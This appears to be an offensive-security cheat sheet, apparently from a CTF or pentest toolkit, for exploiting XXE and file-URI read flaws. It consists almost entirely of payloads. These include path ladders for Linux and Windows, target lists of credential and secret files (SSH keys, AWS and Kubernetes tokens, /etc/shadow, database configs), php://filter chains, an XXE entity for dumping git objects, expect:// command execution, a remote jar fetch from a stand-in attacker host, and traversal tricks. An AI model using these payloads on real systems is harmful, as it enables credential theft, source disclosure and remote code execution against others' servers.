# File Read — deep path corpus and per-stack tricks

## The read ladder — which file first

```
file:///etc/passwd          — existence + users + proves read
file:///etc/hostname        — container/host identity
file:///etc/hosts           — neighbors + the app's own aliases
/proc/self/environ          — env vars — secrets, DB strings, keys
/proc/self/cmdline          — the process — which binary, which args
/proc/self/cwd              — working dir — where the app lives
/proc/self/exe              — the binary path
/proc/net/tcp               — listening ports — internal services
/etc/os-release             — distro → package paths
/etc/issue
```

Then the app itself — source files, configs, secrets.

## The Windows ladder

```
file:///c:/windows/win.ini
file:///c:/boot.ini
file:///c:/windows/system32/drivers/etc/hosts
file:///c:/windows/system.ini
file:///c:/inetpub/wwwroot/web.config
file:///c:/inetpub/wwwroot/iisstart.htm
file:///c:/xampp/php/php.ini
file:///c:/xampp/htdocs/config.php
file:///c:/windows/php/php.ini
file:///c:/Users/*/Desktop/flag.txt
file:///c:/Users/Administrator/Desktop/
file:///c:/Users/Administrator/AppData/Roaming/
file:///c:/Windows/Panther/unattend.xml   — left-over answer file creds
file:///c:/Windows/Panther/Unattend.xml
file:///c:/sysprep/sysprep.xml
```

## The "find the flag" — the common flag paths

```
file:///flag                — the CTF default
file:///flag.txt
file:///root/flag
file:///root/flag.txt
file:///home/ctf/flag
file:///home/ctf/flag.txt
file:///app/flag
file:///var/flag
file:///run/flag
file:///tmp/flag
file:///flag{...}           — the flag AS a filename (rare, hilarious)
file:///proc/1/environ      — env of PID 1
```

## Reading the source — the real payload

The source read that unlocks the next step:

```
file:///var/www/html/index.php
file:///var/www/html/app.py
file:///var/www/html/server.js
file:///var/www/html/config.php
file:///var/www/html/.env
file:///var/www/html/.git/config
file:///app/main.py
file:///app/app.py
file:///app/config.yaml
file:///app/settings.py
file:///opt/app/config.ini
file:///usr/share/nginx/html/
```

The `php://filter/convert.base64-encode` form for PHP source —
raw source read would be re-parsed/echo-mangled, base64 reads clean.

## The .git-leak — read the whole repo through XXE

```
file:///var/www/.git/config
file:///var/www/.git/HEAD
file:///var/www/.git/index
file:///var/www/.git/refs/heads/master
file:///var/www/.git/packed-refs
file:///var/www/.git/objects/xx/yyyy    — need the object name
```

`.git/config` reveals remotes; `.git/HEAD`→`refs`→objects — each object
is zlib-deflated — `php://filter/zlib.inflate` decodes it inline:

```xml
<!ENTITY x SYSTEM "php://filter/zlib.inflate/resource=/var/www/.git/objects/ab/cdef...">
```

## The secret-file corpus — where the keys live

```
/root/.ssh/id_rsa           /home/*/.ssh/id_rsa
/root/.aws/credentials      /home/*/.aws/credentials
/root/.docker/config.json
/root/.kube/config
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/run/secrets/db_password
/etc/shadow                 — needs root-read, tests privilege
/etc/sudoers
/etc/nginx/nginx.conf       /etc/nginx/sites-enabled/*
/etc/apache2/apache2.conf   /etc/apache2/sites-enabled/000-default.conf
/etc/php/*/php.ini
/etc/mysql/my.cnf           /etc/mysql/debian.cnf  — debian-sys-maint creds!
~/.my.cnf                   ~/.pgpass
/etc/redis/redis.conf       — requirepass line
/etc/mongod.conf
/app/.env                   .env.local .env.production
.env .env.* docker-compose.yml
```

## The `/proc` mine — the process's view of itself

```
/proc/self/environ          — env vars NUL-separated
/proc/self/cmdline          — NUL-separated args
/proc/self/cwd              — symlink to working dir — read a file under it
/proc/self/root             — the process's root — inside a chroot?
/proc/self/exe              — binary path
/proc/self/fd/0..N          — open fds — fd to a deleted file!
/proc/self/maps             — mapped libs + ASLR base
/proc/self/status           — UID/GID — is the parser root?
/proc/self/mountinfo        — mounts — what filesystems exist
/proc/self/net/tcp          — listening+established
/proc/1/environ             — PID1's env — container secrets
/proc/1/cmdline
/proc/version
/proc/cpuinfo
/proc/meminfo
```

`/proc/self/fd/N` reads files the process has open — a deleted temp
file, an open log, a socket — the "read a file the app already opened"
trick.

## The PHP-stream read family — `php://`

```
php://filter/convert.base64-encode/resource=/flag
php://filter/convert.base64-encode/resource=./index.php
php://filter/convert.base64-encode/resource=/var/www/html/config.php
php://filter/read=convert.base64-encode/resource=/flag
php://filter/convert.base64-encode|convert.base64-decode/resource=/flag — round-trip
php://filter/zlib.deflate/convert.base64-encode/resource=/big.log
php://filter/convert.iconv.utf-8.utf-16/resource=/flag
php://input                          — the request body itself
php://filter/convert.base64-encode/resource=php://input   — echo body
```

The `iconv` oracle family — `convert.iconv.X.Y` — charset transforms
can leak byte-by-byte via filter-chain behavior — `web-sqli`'s
`filter-chain-oracle` applies the same way here.

## The `phar://` and `expect://` reads — escalation

```
phar:///path/to/x.phar/a    — deser trigger — web-deserialization
expect://id                 — exec — xxe-to-rce.md
expect://cat%20/flag
```

## The jar:`/`netdoc:` reads — Java

```
jar:file:///app.war!/WEB-INF/web.xml
jar:file:///app.jar!/config.properties
jar:http://YOU/x.jar!/x         — remote jar member
netdoc:///etc/passwd
```

## The directory-listing — Java's bonus

`file:///etc/` on Java returns the directory LISTING — not just a
read — the enumeration oracle. Try `/` and `..`-relative forms:

```
file:///               — root listing
file:///etc/
file:///var/www/
file:///var/www/html/
file:///app/
file:///home/
file:///root/
```

The listing reveals filenames to read next — self-directed enumeration.

## The "the file is behind a `file://` but you need a URL" — mixed

`file://` reads don't fire app logic — a flag the app only serves on a
URL needs `http://127.0.0.1/...` — `ssrf-via-xxe.md`.

## The special-char problem — `<`/`&`/`]]>` in the file

`file:///flag` with `<` breaks the doc — `cdata-wrapping.md` or
`php://filter` base64 or the `%`-wrap OOB — the read itself works but
the in-band echo fails — fall to blind channels.

## The null-byte/encoding-trim paths

`file:///flag%00` — some parsers strip trailing bytes — `%00` tricks.
`file:///./flag` — `./` normalization. `file:///../flag` — traversal
inside file: URI — parser-dependent.

## Record the read

- verbatim content as `--evidence`, the full response as `--response`
- the path that worked and the parser that resolved it
